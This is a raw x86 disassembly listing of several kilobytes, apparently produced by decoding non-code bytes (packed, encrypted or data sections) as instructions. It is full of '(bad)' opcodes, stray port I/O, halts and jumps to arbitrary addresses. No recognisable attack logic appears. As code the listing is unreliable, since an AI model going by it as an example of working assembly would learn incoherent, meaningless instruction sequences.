  6b4f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b4f0d:	out    0xab,eax
  6b4f0f:	jb     0x6b4f58
  6b4f11:	and    al,0x98
  6b4f13:	cmp    al,0x19
  6b4f15:	scas   al,BYTE PTR es:[edi]
  6b4f16:	(bad)
  6b4f19:	mov    dl,0x81
  6b4f1b:	icebp  
  6b4f1c:	mov    ch,0xaa
  6b4f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4f1f:	dec    ebp
  6b4f20:	jcxz   0x6b4fa0
  6b4f23:	dec    esi
  6b4f24:	pop    ss
  6b4f25:	xor    cl,BYTE PTR [edi-0x7e]
  6b4f28:	test   al,0xc7
  6b4f2a:	rcr    BYTE PTR [esi+ebx*2-0x4f],cl
  6b4f2e:	sub    BYTE PTR [ebp+0x73],al
  6b4f31:	and    DWORD PTR [edx+0x4b],edx
  6b4f34:	pop    edi
  6b4f35:	in     al,0xd4
  6b4f37:	inc    esp
  6b4f38:	sub    DWORD PTR [eax-0x6b],0x5a
  6b4f3c:	je     0x6b4f2c
  6b4f3e:	sub    eax,0xfc8b5667
  6b4f43:	dec    eax
  6b4f44:	shl    edi,0xba
  6b4f47:	mov    eax,0x318bb1a8
  6b4f4c:	inc    eax
  6b4f4d:	into   
  6b4f4e:	(bad)  
  6b4f4f:	fimul  DWORD PTR [ebp-0xd851ee1]
  6b4f55:	fcmove st,st(5)
  6b4f57:	pextrw edx,(bad),0xc5
  6b4f59:	xchg   esi,eax
  6b4f5a:	pop    es
  6b4f5b:	cmp    al,0x17
  6b4f5d:	pop    ebp
  6b4f5e:	jo     0x6b4fd8
  6b4f60:	xchg   BYTE PTR [ebx-0xc],cl
  6b4f63:	jecxz  0x6b4fa3
  6b4f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b4f66:	repnz pop ds
  6b4f68:	xor    edx,DWORD PTR [edi+0x8]
  6b4f6b:	(bad)  
  6b4f6c:	nop
  6b4f6d:	add    bl,dl
  6b4f6f:	jb     0x6b4fbe
  6b4f71:	out    0x8,al
  6b4f73:	mov    edi,0x8a27a935
  6b4f78:	fbld   TBYTE PTR [ecx-0x2fe1a26e]
  6b4f7e:	das    
  6b4f7f:	(bad)  
  6b4f80:	mov    eax,0x581c5086
  6b4f85:	inc    ecx
  6b4f86:	sub    edx,DWORD PTR [ebx-0x76bc2f67]
  6b4f8c:	push   esp
  6b4f8d:	out    0x34,eax
  6b4f8f:	jp     0x6b4fb7
  6b4f91:	sub    DWORD PTR [eax+0x14bd0888],esp
  6b4f97:	(bad)  
  6b4f98:	push   ebx
  6b4f99:	out    0x6f,eax
  6b4f9b:	push   edi
  6b4f9c:	add    ebx,esp
  6b4f9e:	or     eax,0xe7ce1f59
  6b4fa3:	loope  0x6b4fb3
  6b4fa5:	sbb    dl,BYTE PTR [edx+0x12fe12ae]
  6b4fab:	jno    0x6b4f31
  6b4fad:	in     al,0x9f
  6b4faf:	rcl    BYTE PTR [esi],0x16
  6b4fb2:	add    BYTE PTR [ecx-0x5],dh
  6b4fb5:	pushf  
  6b4fb6:	gs xchg esp,eax
  6b4fb8:	jne    0x6b4f8e
  6b4fba:	push   esp
  6b4fbb:	xchg   esi,eax
  6b4fbc:	push   ss
  6b4fbd:	jo     0x6b5031
  6b4fbf:	out    0xad,al
  6b4fc1:	jp     0x6b4fa0
  6b4fc3:	cli    
  6b4fc4:	mov    dh,0x4c
  6b4fc6:	sbb    al,0x25
  6b4fc8:	in     eax,dx
  6b4fc9:	sbb    ebp,eax
  6b4fcb:	add    DWORD PTR [ebp+0x17],0x902e006d
  6b4fd2:	outs   dx,DWORD PTR ds:[esi]
  6b4fd3:	(bad)  
  6b4fd4:	not    DWORD PTR [ebx]
  6b4fd6:	add    BYTE PTR [edx-0x1a],cl
  6b4fd9:	inc    esp
  6b4fda:	pop    ds
  6b4fdb:	fcmovnb st,st(7)
  6b4fdd:	out    dx,eax
  6b4fde:	outs   dx,DWORD PTR ds:[esi]
  6b4fdf:	leave  
  6b4fe0:	mov    cl,0x5e
  6b4fe2:	outs   dx,DWORD PTR ds:[esi]
  6b4fe3:	mov    bh,0xfb
  6b4fe5:	adc    edi,DWORD PTR es:[eiz*4-0x67b6edfd]
  6b4fed:	(bad)  
  6b4fee:	adc    ecx,DWORD PTR [edx+0x1c590ab6]
  6b4ff4:	test   eax,0x944219ee
  6b4ff9:	adc    cl,0x91
  6b4ffc:	add    dl,0xf9
  6b4fff:	ins    DWORD PTR es:[edi],dx
  6b5000:	sbb    ah,BYTE PTR [ecx+esi*2]
  6b5003:	cmp    BYTE PTR [ecx+esi*8-0x61],dh
  6b5007:	mov    dh,0x1e
  6b5009:	and    al,0x2e
  6b500b:	and    bh,dl
  6b500d:	adc    BYTE PTR [edi+0x70],bl
  6b5010:	mov    esp,0x2fb57e37
  6b5015:	push   cs
  6b5016:	mov    eax,ds:0x5f3a6204
  6b501b:	fcomp  QWORD PTR [esi]
  6b501d:	dec    edi
  6b501e:	mov    ebx,0x1a5e13e6
  6b5023:	push   ecx
  6b5024:	in     eax,dx
  6b5025:	out    0xdb,eax
  6b5027:	mov    al,bl
  6b5029:	in     al,dx
  6b502a:	sti    
  6b502b:	xor    DWORD PTR [ecx-0x59fb9327],esi
  6b5031:	add    BYTE PTR [ecx-0x4a78c33a],dl
  6b5037:	test   eax,0x9c00ae87
  6b503c:	xor    al,0x43
  6b503e:	sbb    BYTE PTR [esi+0x334bba7],cl
  6b5044:	push   0xd39654ce
  6b5049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b504a:	add    cl,BYTE PTR [ebx-0x4f2a4feb]
  6b5050:	push   0x2b
  6b5052:	xchg   ecx,eax
  6b5053:	add    ch,BYTE PTR [edi-0x6]
  6b5056:	out    dx,al
  6b5057:	mov    ds:0x1e65358f,al
  6b505c:	dec    esp
  6b505d:	enter  0x3a9a,0x6c
  6b5061:	mov    ebx,0x6786da47
  6b5066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5067:	sub    BYTE PTR [ecx],0x72
  6b506a:	sub    ecx,DWORD PTR [ecx+ecx*2+0x75a676e4]
  6b5071:	gs ds xchg esp,eax
  6b5074:	add    dh,al
  6b5076:	add    BYTE PTR [ecx+0x11],bl
  6b5079:	aas    
  6b507a:	mov    ebp,0x1239ca8e
  6b507f:	lods   al,BYTE PTR ds:[esi]
  6b5080:	mov    ebp,0x1b05b855
  6b5085:	push   esi
  6b5086:	xor    esi,DWORD PTR [edi+0x21]
  6b5089:	ins    DWORD PTR es:[edi],dx
  6b508a:	les    ebp,FWORD PTR ds:0xbcede9cd
  6b5090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5091:	std    
  6b5092:	or     edi,DWORD PTR [ecx]
  6b5094:	mul    DWORD PTR [ecx-0x4e]
  6b5097:	jb     0x6b50e7
  6b5099:	push   ebp
  6b509a:	jmp    0x6b5110
  6b509c:	fcmovnu st,st(2)
  6b509e:	repnz mov BYTE PTR [esp+eiz*2],dl
  6b50a2:	lock pusha 
  6b50a4:	mov    DWORD PTR ds:0x9ad55d3,esp
  6b50aa:	loope  0x6b5049
  6b50ac:	out    0xe4,eax
  6b50ae:	aaa    
  6b50af:	sub    eax,0x4b48394
  6b50b4:	mov    ebx,0x20132344
  6b50b9:	test   bh,ah
  6b50bb:	adc    al,0x35
  6b50bd:	out    0x5f,al
  6b50bf:	hlt    
  6b50c0:	js     0x6b50e7
  6b50c2:	adc    BYTE PTR [ebx],al
  6b50c4:	sbb    DWORD PTR [esi-0x65],0xffffff9a
  6b50c8:	std    
  6b50c9:	lea    esi,[ecx+0x66]
  6b50cc:	add    al,0x8e
  6b50ce:	jg     0x6b50d3
  6b50d0:	jg     0x6b5060
  6b50d2:	add    eax,eax
  6b50d4:	add    ebx,esi
  6b50d6:	fmul   st,st(3)
  6b50d8:	nop
  6b50d9:	test   BYTE PTR [ebx+0x35039d2f],ch
  6b50df:	mov    edx,0xb918470a
  6b50e4:	sub    al,0x7
  6b50e6:	sbb    DWORD PTR [ecx-0x38],esi
  6b50e9:	xchg   ebp,eax
  6b50ea:	cmc    
  6b50eb:	and    al,0xfe
  6b50ed:	jae    0x6b5090
  6b50ef:	mov    al,ds:0x20152b72
  6b50f4:	jnp    0x6b50c8
  6b50f6:	test   eax,0x7a6bbbfd
  6b50fb:	idiv   dh
  6b50fd:	pop    ecx
  6b50fe:	jo     0x6b50c1
  6b5100:	sub    al,0x65
  6b5102:	and    al,0x38
  6b5104:	nop
  6b5105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b5106:	test   BYTE PTR [edx],0x98
  6b5109:	dec    ecx
  6b510a:	retf   
  6b510b:	push   cs
  6b510c:	sti    
  6b510d:	mov    DWORD PTR [ebp+0x2f4c9725],ebp
  6b5113:	jle    0x6b50a5
  6b5115:	xor    BYTE PTR [edi],dl
  6b5117:	dec    ebx
  6b5118:	std    
  6b5119:	sbb    al,0x8b
  6b511b:	lods   al,BYTE PTR ds:[esi]
  6b511c:	pop    esi
  6b511d:	dec    edx
  6b511e:	not    esi
  6b5120:	out    dx,eax
  6b5121:	xchg   edx,eax
  6b5122:	sti    
  6b5123:	xor    al,0x1c
  6b5125:	dec    esp
  6b5126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5127:	mov    ds:0x819a76c6,eax
  6b512c:	stos   DWORD PTR es:[edi],eax
  6b512d:	mov    DWORD PTR [eax-0x65],esp
  6b5130:	cmp    ah,BYTE PTR [ecx+0x366a62b9]
  6b5136:	retf   
  6b5137:	js     0x6b51b3
  6b5139:	and    eax,0x657e829
  6b513e:	adc    ebp,edi
  6b5140:	push   0x57fd8ce6
  6b5145:	xor    eax,0xee3ae3d0
  6b514a:	xchg   edi,eax
  6b514b:	mov    bl,0x5
  6b514d:	xor    DWORD PTR [eax+0x3476c672],esi
  6b5153:	push   eax
  6b5154:	rcl    DWORD PTR [edi],0x2c
  6b5157:	gs dec ebp
  6b5159:	mov    ebp,0xc4d3c9bd
  6b515e:	retf   0x49d
  6b5161:	inc    esp
  6b5162:	std    
  6b5163:	cli    
  6b5164:	adc    DWORD PTR ss:[edi+eax*8-0x4fdbefc],esp
  6b516c:	inc    esp
  6b516d:	xchg   BYTE PTR ds:0x8254,dl
  6b5172:	(bad)  
  6b5173:	imul   eax,esp,0x5cad9fb7
  6b5179:	xlat   BYTE PTR ds:[ebx]
  6b517a:	(bad)  
  6b517b:	jp     0x6b514f
  6b517d:	jmp    0xe726f7a0
  6b5182:	(bad)  
  6b5183:	adc    eax,0xd50ce813
  6b5188:	ins    BYTE PTR es:[edi],dx
  6b5189:	cmova  esp,DWORD PTR [ebp+0x6752f774]
  6b5190:	cmp    BYTE PTR [eax+edx*1+0x4adb5984],bh
  6b5197:	sti    
  6b5198:	and    DWORD PTR [ebp-0x6751e4fa],ebp
  6b519e:	in     al,0x36
  6b51a0:	rol    BYTE PTR [edi+0xbdb1ef3],1
  6b51a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b51a7:	fsub   st(7),st
  6b51a9:	test   al,0xe1
  6b51ab:	sub    eax,0xd7d4c79f
  6b51b0:	inc    eax
  6b51b1:	jge    0x6b51fd
  6b51b3:	mov    ebp,0x2a5353b9
  6b51b8:	jb     0x6b5150
  6b51ba:	je     0x6b51f4
  6b51bc:	popa   
  6b51bd:	xchg   ecx,eax
  6b51be:	shr    BYTE PTR [ecx+0x74a84d6],cl
  6b51c4:	xor    BYTE PTR [ebp-0x15],bh
  6b51c7:	arpl   WORD PTR [edi-0x3b],dx
  6b51ca:	jbe    0x6b5247
  6b51cc:	sbb    al,0xf9
  6b51ce:	inc    eax
  6b51cf:	nop
  6b51d0:	xchg   edi,eax
  6b51d1:	mov    bl,0x80
  6b51d3:	loope  0x6b523f
  6b51d5:	add    dl,BYTE PTR [ebp+0x12]
  6b51d8:	test   eax,0x4655b28e
  6b51dd:	call   FWORD PTR [esi]
  6b51df:	stc    
  6b51e0:	mov    ch,0x35
  6b51e2:	add    eax,DWORD PTR [ebx]
  6b51e4:	push   ds
  6b51e5:	in     eax,0xf7
  6b51e7:	mov    al,ds:0x701c4e85
  6b51ec:	inc    cx
  6b51ee:	cmp    ebp,DWORD PTR [esi-0x58]
  6b51f1:	jmp    0xee5b:0xe69572f6
  6b51f8:	dec    edx
  6b51f9:	push   esp
  6b51fa:	sub    ecx,ecx
  6b51fc:	pop    edi
  6b51fd:	push   edi
  6b51fe:	in     eax,dx
  6b51ff:	mov    ah,0xf6
  6b5201:	retf   
  6b5202:	cmp    eax,0x638c792
  6b5207:	imul   edi,DWORD PTR [ebp-0x6b],0x4a5b1b
  6b520e:	or     DWORD PTR [ecx+0x2c],esi
  6b5211:	sbb    ch,BYTE PTR [ecx]
  6b5213:	xchg   esi,eax
  6b5214:	xor    ebp,DWORD PTR [ebx-0x309a6139]
  6b521a:	sub    dl,BYTE PTR gs:[ebp+0x1a]
  6b521e:	adc    ebx,DWORD PTR [edx]
  6b5220:	pop    es
  6b5221:	(bad)  
  6b5222:	(bad)  
  6b5223:	daa    
  6b5224:	loope  0x6b51f0
  6b5226:	rol    BYTE PTR [edi+eax*8],cl
  6b5229:	adc    dl,BYTE PTR fs:[eax+0x66]
  6b522d:	xchg   ebp,eax
  6b522e:	adc    al,0xae
  6b5230:	pop    esp
  6b5231:	nop
  6b5232:	xor    BYTE PTR [ecx],0x6b
  6b5235:	sbb    esi,edi
  6b5237:	loopne 0x6b527f
  6b5239:	cmp    BYTE PTR [esi+0x5a443607],ah
  6b523f:	pop    esp
  6b5240:	mov    dl,BYTE PTR [ebp+0x593921dd]
  6b5246:	sub    eax,0x9b62ffd8
  6b524b:	aaa    
  6b524c:	dec    esi
  6b524d:	push   esp
  6b524e:	mov    esi,0x72042a58
  6b5253:	cmp    eax,0x2d517031
  6b5258:	jle    0x6b521b
  6b525a:	inc    ebp
  6b525b:	push   edi
  6b525c:	in     eax,0xef
  6b525e:	jle    0x6b52ac
  6b5260:	stos   DWORD PTR es:[edi],eax
  6b5261:	icebp  
  6b5262:	add    BYTE PTR [edi],dl
  6b5264:	mov    eax,ds:0x79cb84b1
  6b5269:	mov    WORD PTR [ecx+0x41],gs
  6b526c:	hlt    
  6b526d:	sbb    DWORD PTR [edx+esi*4],esi
  6b5270:	call   FWORD PTR [edx-0x28]
  6b5273:	popa   
  6b5274:	sub    DWORD PTR [ebx+eiz*8],ecx
  6b5277:	jo     0x6b5228
  6b5279:	iret   
  6b527a:	adc    al,0xfb
  6b527c:	xor    al,0x4d
  6b527e:	imul   ebx,DWORD PTR [esi+ecx*1-0x1f],0x56
  6b5283:	cli    
  6b5284:	xchg   dl,al
  6b5286:	adc    bl,ah
  6b5288:	rol    DWORD PTR [esi+esi*4-0x59ec82e3],1
  6b528f:	pop    ds
  6b5290:	jmp    0xcbbbfcc3
  6b5295:	aaa    
  6b5296:	xor    ecx,DWORD PTR [ebp+0x5]
  6b5299:	xchg   ebp,eax
  6b529a:	clc    
  6b529b:	jbe    0x6b525c
  6b529d:	pop    esp
  6b529e:	mov    dl,0xd3
  6b52a0:	loope  0x6b525b
  6b52a2:	idiv   DWORD PTR [ebp-0x522e5a6a]
  6b52a8:	pop    esi
  6b52a9:	xchg   ebx,ecx
  6b52ab:	fwait
  6b52ac:	test   eax,0x6e5820fe
  6b52b1:	hlt    
  6b52b2:	(bad)
  6b52b5:	(bad)
  6b52b8:	dec    ecx
  6b52b9:	or     eax,0x912a4a09
  6b52be:	mov    eax,0x623c34da
  6b52c3:	hlt    
  6b52c4:	mov    bl,0x7d
  6b52c6:	faddp  st(5),st
  6b52c8:	jmp    0x35747dc5
  6b52cd:	mov    dl,0x6f
  6b52cf:	jne    0x6b5329
  6b52d1:	retf   0x44f
  6b52d4:	ins    DWORD PTR es:[edi],dx
  6b52d5:	pop    esi
  6b52d7:	dec    edx
  6b52d8:	into   
  6b52d9:	push   ds
  6b52da:	dec    edx
  6b52db:	ja     0x6b5263
  6b52dd:	push   esp
  6b52de:	data16 ja 0x6b5316
  6b52e1:	and    BYTE PTR [esp+ecx*4+0x18],al
  6b52e5:	mov    esp,0x4f5f3ad0
  6b52ea:	mov    al,0xf6
  6b52ec:	rcr    DWORD PTR [edi+0x2dd21f13],cl
  6b52f2:	clc    
  6b52f3:	mov    dh,BYTE PTR [ecx+0x7fbbc8f9]
  6b52f9:	mov    DWORD PTR [esi-0x33debb3c],edi
  6b52ff:	jmp    0x6b532a
  6b5301:	(bad)  
  6b5302:	push   ebp
  6b5303:	jmp    0xd6440d10
  6b5308:	popa   
  6b5309:	not    DWORD PTR [ebp-0x779da551]
  6b530f:	pop    ss
  6b5310:	push   edi
  6b5311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b5312:	aad    0x1c
  6b5314:	xor    ebp,DWORD PTR [ebx-0x43af203c]
  6b531a:	push   ss
  6b531b:	mov    al,ds:0xea630239
  6b5320:	or     eax,0x14b3857c
  6b5325:	test   DWORD PTR [esi+0x36f11d78],ebx
  6b532b:	mov    ebp,0x66c87045
  6b5330:	data16 add BYTE PTR [esi-0x3c],cl
  6b5334:	and    eax,DWORD PTR [esi+0x530ebe24]
  6b533a:	adc    al,0xc7
  6b533c:	inc    ebx
  6b533d:	jmp    0x972d2f7e
  6b5342:	jns    0x6b531f
  6b5344:	and    BYTE PTR [edi-0x6ec602c1],dl
  6b534a:	dec    di
  6b534c:	sub    ebx,DWORD PTR [edi+esi*2-0x4b364777]
  6b5353:	out    dx,eax
  6b5354:	arpl   WORD PTR [esi+0x1627ddf4],di
  6b535a:	out    dx,eax
  6b535b:	rol    DWORD PTR [edx+0x7dce0e41],1
  6b5361:	xor    DWORD PTR [ecx],edx
  6b5363:	sbb    DWORD PTR [esi+0x418cd1f5],0x3a
  6b536a:	adc    al,0x99
  6b536c:	and    al,0xd2
  6b536e:	or     eax,DWORD PTR [ebx-0x141480a1]
  6b5374:	adc    BYTE PTR [esi+0x0],al
  6b5377:	rol    DWORD PTR [eax],0x70
  6b537a:	(bad)  
  6b537b:	shl    ah,cl
  6b537d:	sbb    DWORD PTR [edi+0x41],0xffffffe3
  6b5381:	fimul  WORD PTR [eax+edi*4+0x53]
  6b5385:	addr16 addr16 loopne 0x6b538f
  6b5389:	ja     0x6b5362
  6b538b:	xor    DWORD PTR [edi+0x707e3771],ebx
  6b5391:	das    
  6b5392:	pop    ebx
  6b5393:	push   0xffffffaf
  6b5395:	out    dx,al
  6b5396:	lahf   
  6b5397:	hlt    
  6b5398:	pop    edi
  6b5399:	jecxz  0x6b5375
  6b539b:	inc    ebx
  6b539c:	cmp    dl,BYTE PTR [edx+0x3c]
  6b539f:	pushf  
  6b53a0:	jno    0x6b532e
  6b53a2:	(bad)  
  6b53a3:	xor    eax,0x8ead0080
  6b53a8:	sbb    DWORD PTR [esi+0x6431614],edx
  6b53ae:	(bad)  [ebx+0x588b3fa6]
  6b53b4:	jmp    0xc81dc4b4
  6b53b9:	jb     0x6b53e8
  6b53bb:	dec    ebp
  6b53bc:	in     al,dx
  6b53bd:	aaa    
  6b53be:	push   0x1ef2375d
  6b53c3:	aam    0xa3
  6b53c5:	xchg   BYTE PTR [edx-0x371eb7f4],ch
  6b53cb:	sub    BYTE PTR [ebp+0x1a],ah
  6b53ce:	sub    al,0x5b
  6b53d0:	mov    DWORD PTR [esi+0x3a497582],eax
  6b53d6:	xchg   edx,eax
  6b53d7:	mov    ch,BYTE PTR [edx+0x27df465a]
  6b53dd:	pop    es
  6b53de:	cmp    bh,BYTE PTR [ebx-0x65]
  6b53e1:	fimul  WORD PTR [esi]
  6b53e3:	(bad)  
  6b53e4:	aas    
  6b53e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b53e6:	das    
  6b53e7:	(bad)  
  6b53e8:	mov    esi,0xdbb4695e
  6b53ed:	sub    eax,0xc09a57ae
  6b53f2:	out    dx,eax
  6b53f3:	xor    edi,DWORD PTR [ebx]
  6b53f5:	xchg   esi,eax
  6b53f6:	call   0x67ce7025
  6b53fb:	xchg   esi,eax
  6b53fc:	inc    ebp
  6b53fd:	out    dx,al
  6b53fe:	aas    
  6b53ff:	add    DWORD PTR [ebp-0x15fa04d0],esp
  6b5405:	(bad)  
  6b5406:	xor    ebx,esi
  6b5408:	sub    edi,DWORD PTR [ebp-0x50]
  6b540b:	adc    ah,BYTE PTR [esi+edi*4-0x4e]
  6b540f:	clc    
  6b5410:	jge    0x6b5490
  6b5412:	dec    edi
  6b5413:	pusha  
  6b5414:	jne    0x6b53e5
  6b5416:	dec    eax
  6b5417:	dec    DWORD PTR [edx-0x484d4791]
  6b541d:	out    0x2f,eax
  6b541f:	jmp    0x1a21574b
  6b5424:	mov    esp,0x1b51baa7
  6b5429:	xchg   ebx,eax
  6b542a:	adc    DWORD PTR [edi-0x73e55ec8],ebx
  6b5430:	xchg   ecx,eax
  6b5431:	mov    ch,0x98
  6b5433:	add    eax,0x3ced35de
  6b5438:	fcmovbe st,st(6)
  6b543a:	push   edx
  6b543b:	push   0xffffffc7
  6b543d:	shr    eax,0xfc
  6b5440:	clc    
  6b5441:	push   eax
  6b5442:	shr    BYTE PTR [ebx+ecx*8],1
  6b5445:	fistp  WORD PTR [edx]
  6b5447:	(bad)  
  6b5449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b544a:	int3   
  6b544b:	daa    
  6b544c:	mov    ds:0xce8eb6bb,al
  6b5451:	jno    0x6b542e
  6b5453:	jns    0x6b5438
  6b5455:	sbb    esp,DWORD PTR [edi-0x6e]
  6b5458:	std    
  6b5459:	and    BYTE PTR [eax],bh
  6b545b:	xchg   edi,eax
  6b545c:	inc    edx
  6b545d:	stos   BYTE PTR es:[edi],al
  6b545e:	push   eax
  6b545f:	jge    0x6b54d1
  6b5461:	pop    ds
  6b5462:	cmp    eax,0x21a7b8f9
  6b5467:	mov    edi,0xf6f6cdb2
  6b546c:	jns    0x6b548e
  6b546e:	pop    ebp
  6b546f:	mov    bh,0x5a
  6b5471:	dec    ecx
  6b5472:	shl    DWORD PTR [eax],1
  6b5474:	cmp    BYTE PTR [ebx+0x3f77fe95],cl
  6b547a:	ss das 
  6b547c:	jne    0x6b54cc
  6b547e:	js     0x6b54a1
  6b5480:	adc    DWORD PTR [eax],edx
  6b5482:	fisttp WORD PTR [ebx-0x29]
  6b5485:	adc    eax,0xcd7f18a1
  6b548a:	adc    DWORD PTR [ebx+0x37],ebp
  6b548d:	mov    eax,0x7edcd5bb
  6b5492:	jl     0x6b54b0
  6b5494:	xor    al,0x39
  6b5496:	sub    BYTE PTR [eax+0x2],cl
  6b5499:	(bad)  
  6b549a:	shl    DWORD PTR [eax-0x6c],1
  6b549d:	sub    eax,0xa30fdb55
  6b54a2:	aad    0x63
  6b54a4:	xlat   BYTE PTR ds:[ebx]
  6b54a5:	cmp    ebp,0x302c86ef
  6b54ab:	ret    
  6b54ac:	add    BYTE PTR [edx+ebx*4+0x5f],dl
  6b54b0:	loope  0x6b5433
  6b54b2:	add    DWORD PTR ss:[esi],edx
  6b54b5:	lods   al,BYTE PTR ds:[esi]
  6b54b6:	mov    ebp,0xdfea239a
  6b54bb:	adc    ch,cl
  6b54bd:	xchg   esi,eax
  6b54be:	cmp    al,0xd6
  6b54c0:	or     DWORD PTR [ecx],edi
  6b54c2:	scas   al,BYTE PTR es:[edi]
  6b54c3:	sub    edi,ebx
  6b54c5:	xor    dh,BYTE PTR [edx]
  6b54c7:	out    0x5f,al
  6b54c9:	in     eax,dx
  6b54ca:	lahf   
  6b54cb:	into   
  6b54cc:	retf   
  6b54cd:	xlat   BYTE PTR ds:[ebx]
  6b54ce:	ret    
  6b54cf:	pop    ds
  6b54d0:	xor    eax,DWORD PTR [eax-0x71]
  6b54d3:	or     ch,ah
  6b54d5:	idiv   BYTE PTR [ecx+0x66092721]
  6b54db:	pop    ebx
  6b54dc:	push   esp
  6b54dd:	jmp    0xd57c2690
  6b54e2:	out    dx,eax
  6b54e3:	ror    DWORD PTR [eax],1
  6b54e5:	in     al,0x87
  6b54e7:	push   eax
  6b54e8:	call   0x6cde:0x90685614
  6b54ef:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  6b54f1:	xor    ch,BYTE PTR [ecx]
  6b54f3:	ror    DWORD PTR es:[ebx-0x5d75e4d1],cl
  6b54fa:	(bad)  
  6b54fb:	mov    dl,0x26
  6b54fd:	in     eax,0x48
  6b54ff:	lahf   
  6b5500:	outs   dx,DWORD PTR ds:[esi]
  6b5501:	add    eax,0x827c92e7
  6b5506:	inc    ecx
  6b5507:	popf   
  6b5508:	repz or al,0xa8
  6b550b:	das    
  6b550c:	mov    ch,0x62
  6b550e:	push   DWORD PTR [edx+eax*8-0x5ef87106]
  6b5515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5516:	cmp    BYTE PTR [eax+0xd],dl
  6b5519:	add    edx,ebx
  6b551b:	daa    
  6b551c:	mov    ds:0x5ee06687,al
  6b5521:	jno    0x6b5505
  6b5523:	pop    ds
  6b5524:	ret    
  6b5525:	dec    esi
  6b5526:	xor    DWORD PTR [eax-0x4f],0x806ad8bb
  6b552d:	(bad)  
  6b552e:	fbld   TBYTE PTR [esi+ebp*8+0x164def37]
  6b5535:	lock inc ebp
  6b5537:	scas   al,BYTE PTR es:[edi]
  6b5538:	cli    
  6b5539:	push   eax
  6b553a:	push   esp
  6b553b:	jmp    0x6b54f4
  6b553d:	jg     0x6b5505
  6b553f:	xchg   BYTE PTR [ebx],bh
  6b5541:	iret   
  6b5542:	scas   eax,DWORD PTR es:[edi]
  6b5543:	retf   
  6b5544:	retf   
  6b5545:	imul   edi,DWORD PTR [ebx+ecx*1+0x53],0xffffffa1
  6b554a:	jl     0x6b55ad
  6b554c:	mov    esi,0xd3b113c6
  6b5551:	dec    esi
  6b5552:	xor    ebp,esi
  6b5554:	js     0x6b55d3
  6b5556:	shrd   DWORD PTR [edi+0x5489d993],edx,0x4f
  6b555e:	imul   edi,DWORD PTR [esp+eiz*4],0xe9e7680d
  6b5565:	jle    0x6b55a1
  6b5567:	in     eax,0x99
  6b5569:	add    al,0xa7
  6b556b:	and    DWORD PTR [esi],ecx
  6b556d:	xchg   ebp,eax
  6b556e:	sub    al,bh
  6b5570:	pop    edx
  6b5571:	fist   DWORD PTR [ebx]
  6b5573:	out    dx,al
  6b5574:	ins    BYTE PTR es:[edi],dx
  6b5575:	or     ecx,DWORD PTR [ecx+0x74298755]
  6b557b:	je     0x6b55f2
  6b557d:	mov    eax,DWORD PTR [ecx+ebx*4]
  6b5580:	mov    ebx,0xd210e6a7
  6b5585:	and    ch,ch
  6b5587:	push   es
  6b5588:	into   
  6b5589:	mov    esp,0xd9b0eea
  6b558e:	cld    
  6b558f:	clc    
  6b5590:	push   ss
  6b5591:	fild   WORD PTR [esp+esi*4]
  6b5594:	or     DWORD PTR [ebp+0x31],ecx
  6b5597:	inc    edx
  6b5598:	xchg   esp,eax
  6b5599:	aas    
  6b559a:	adc    eax,0x3e6f189b
  6b559f:	xchg   BYTE PTR [edi-0x73],bh
  6b55a2:	lahf   
  6b55a3:	aas    
  6b55a4:	mov    eax,0x8f8228dd
  6b55a9:	out    0xa4,al
  6b55ab:	test   eax,0x118690f1
  6b55b0:	repz stc 
  6b55b2:	loope  0x6b559b
  6b55b4:	cmp    al,0xa3
  6b55b6:	push   edx
  6b55b7:	sahf   
  6b55b8:	scas   al,BYTE PTR es:[edi]
  6b55b9:	push   esi
  6b55ba:	push   0xf7010146
  6b55bf:	cwde   
  6b55c0:	fadd   QWORD PTR [eax+0x1ab08b04]
  6b55c6:	loopne 0x6b5561
  6b55c8:	mov    dl,0xc4
  6b55ca:	or     DWORD PTR [eax-0x1faf0e95],ebx
  6b55d0:	pop    ss
  6b55d1:	cwde   
  6b55d2:	nop
  6b55d3:	imul   ebx,DWORD PTR [edx+0x68],0xffffffa6
  6b55d7:	lods   eax,DWORD PTR ds:[esi]
  6b55d8:	ins    BYTE PTR es:[edi],dx
  6b55d9:	(bad)  
  6b55da:	aam    0x16
  6b55dc:	mov    es:0x79fe2f1e,al
  6b55e2:	xor    ah,BYTE PTR [ebx+0x6521d60]
  6b55e8:	bound  esp,QWORD PTR [esp+ebp*4]
  6b55eb:	popf   
  6b55ec:	mov    edi,0xe7c90872
  6b55f1:	into   
  6b55f2:	sub    bl,ch
  6b55f4:	aam    0x66
  6b55f6:	sti    
  6b55f7:	jbe    0x6b5591
  6b55f9:	add    eax,DWORD PTR [ebx]
  6b55fb:	push   0xffffffb3
  6b55fd:	pop    ds
  6b55fe:	mov    esi,0xd62a1739
  6b5603:	out    dx,al
  6b5604:	idiv   DWORD PTR [esi-0x3a]
  6b5607:	test   DWORD PTR ds:0x4e03c903,edx
  6b560d:	std    
  6b560e:	fisub  DWORD PTR [edi+eiz*2+0x5]
  6b5612:	in     eax,0xc2
  6b5614:	or     cl,BYTE PTR [ebp-0x2323f278]
  6b561a:	imul   edi,DWORD PTR [edi+ebx*4+0x5d],0xde2b95b
  6b5622:	push   cs
  6b5623:	cmp    eax,0xf6cff3ab
  6b5628:	mov    edi,ecx
  6b562a:	mov    eax,ss
  6b562c:	inc    edx
  6b562d:	xor    bh,BYTE PTR [esi-0x4c]
  6b5630:	xchg   ebp,eax
  6b5631:	push   ds
  6b5632:	pop    edx
  6b5633:	fwait
  6b5634:	js     0x6b55d2
  6b5636:	cld    
  6b5637:	push   ds
  6b5638:	mov    edx,0xa114686c
